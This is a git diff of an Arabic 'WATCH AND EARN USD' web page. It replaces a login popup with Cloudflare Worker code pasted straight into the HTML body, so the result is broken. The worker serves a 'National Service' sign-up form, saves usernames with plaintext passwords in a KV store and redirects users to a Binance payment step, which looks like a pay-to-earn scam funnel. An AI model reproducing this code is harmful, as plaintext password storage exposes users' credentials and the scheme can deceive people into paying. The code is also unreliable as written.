@@ -100,39 +100,75 @@
         </p>
         
         <!-- الزر الأخضر التفاعلي الجديد -->
-        <a href="#" id="earnBtn" class="green-btn">WATCH AND EARN USD</a>
-</div>
+        export default {
+  async fetch(request, env) {
+    const url = new URL(request.url);
 
-<!-- نافذة تسجيل الدخول المنبثقة -->
-<div id="loginOverlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.75); z-index: 9999; justify-content: center; align-items: center; direction: rtl;">
-    <div style="background: #ffffff; color: #333; padding: 30px 25px; border-radius: 15px; width: 85%; max-width: 320px; text-align: center; box-shadow: 0 5px 25px rgba(0,0,0,0.3); font-family: sans-serif;">
-        <h3 style="margin-top: 0; margin-bottom: 20px; color: #5d25cd;">تسجيل الدخول للمتابعة</h3>
-        <input type="text" placeholder="اسم المستخدم أو البريد" style="width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 14px;">
-        <input type="password" placeholder="كلمة المرور" style="width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 14px;">
-        <button onclick="submitLogin()" style="background: #5d25cd; color: white; border: none; padding: 12px 20px; border-radius: 8px; cursor: pointer; width: 100%; font-size: 16px; font-weight: bold; margin-top: 15px;">تسجيل الدخول</button>
-    </div>
-</div>
-
-<script>
-    // فتح القائمة عند الضغط على الزر الأخضر
-    document.getElementById('earnBtn').addEventListener('click', function(e) {
-        e.preventDefault();
-        document.getElementById('loginOverlay').style.display = 'flex';
-    });
-
-    // إغلاق القائمة عند الضغط في الخلفية السوداء الفارغة
-    document.getElementById('loginOverlay').addEventListener('click', function(e) {
-        if(e.target === this) {
-            this.style.display = 'none';
-        }
-    });
-
-    // وظيفة زر تسجيل الدخول
-    function submitLogin() {
-        alert('تم تسجيل الدخول بنجاح!');
-        document.getElementById('loginOverlay').style.display = 'none';
+    // 1. عرض واجهة "إنشاء حساب جديد" للمستخدم
+    if (request.method === "GET") {
+      const html = `
+      <!DOCTYPE html>
+      <html lang="ar" dir="rtl">
+      <head>
+          <meta charset="UTF-8">
+          <meta name="viewport" content="width=device-width, initial-scale=1.0">
+          <title>إنشاء حساب جديد - الخدمة الوطنية</title>
+          <style>
+              body { font-family: Arial, sans-serif; text-align: center; background-color: #0b051d; padding: 40px; color: #fff; }
+              .card { background: #171030; max-width: 380px; margin: auto; padding: 30px; border-radius: 15px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); border: 1px solid #31255c; }
+              h2 { color: #8b5cf6; margin-bottom: 5px; font-size: 24px; }
+              p { color: #9ca3af; font-size: 14px; margin-bottom: 25px; }
+              input, button { width: 100%; padding: 14px; margin: 10px 0; border-radius: 8px; border: 1px solid #31255c; box-sizing: border-box; font-size: 16px; }
+              input { background: #0b051d; color: #fff; text-align: right; }
+              input:focus { border-color: #8b5cf6; outline: none; }
+              button { background-color: #8b5cf6; color: white; font-weight: bold; border: none; cursor: pointer; transition: 0.3s; margin-top: 15px; }
+              button:hover { background-color: #7c3aed; }
+              .footer-text { font-size: 12px; color: #6b7280; margin-top: 15px; }
+          </style>
+      </head>
+      <body>
+          <div class="card">
+              <h2>إنشاء حساب جديد للمتابعة</h2>
+              <p>يرجى تعيين اسم مستخدم وكلمة مرور خاصة بموقعنا</p>
+              
+              <form action="/api/register" method="POST">
+                  <input type="text" name="username" placeholder="اسم المستخدم أو البريد" required>
+                  <input type="password" name="password" placeholder="اختر كلمة مرور للموقع" required>
+                  
+                  <button type="submit">🛡️ إنشاء الحساب والانتقال للدفع</button>
+              </form>
+              <div class="footer-text">شاهد واكسب WATCH AND EARN USD</div>
+          </div>
+      </body>
+      </html>
+      `;
+      return new Response(html, { headers: { "Content-Type": "text/html; charset=utf-8" } });
     }
-</script>
 
-</body>
-</html>
+    // 2. معالجة البيانات تلقائياً عند الضغط على الزر
+    if (url.pathname === "/api/register" && request.method === "POST") {
+      const formData = await request.formData();
+      const username = formData.get("username");
+      const password = formData.get("password");
+
+      if (!username || !password) {
+        return new Response("يرجى ملء جميع الحقول", { status: 400 });
+      }
+
+      // حفظ الحساب الجديد في قاعدة بيانات كلوود فلير المجانية (KV)
+      // نربط اسم المستخدم بكلمة المرور الخاصة به وحالة الحساب (غير مفعل حتى يدفع)
+      const userData = JSON.stringify({ password: password, status: "pending_payment" });
+      
+      if (env.USERS_DB) {
+        await env.USERS_DB.put(username, userData);
+      }
+
+      // بعد حفظ الحساب بنجاح، نقوم بتحويله تلقائياً لصفحة الدفع باينانس التي طلبتموها سابقاً
+      // سنقوم هنا بتحويله إلى دالة الدفع التلقائي لباينانس مباشرة
+      return Response.redirect(url.origin + "/api/checkout", 307);
+    }
+
+    return new Response("الصفحة غير موجودة", { status: 404 });
+  }
+};
+        
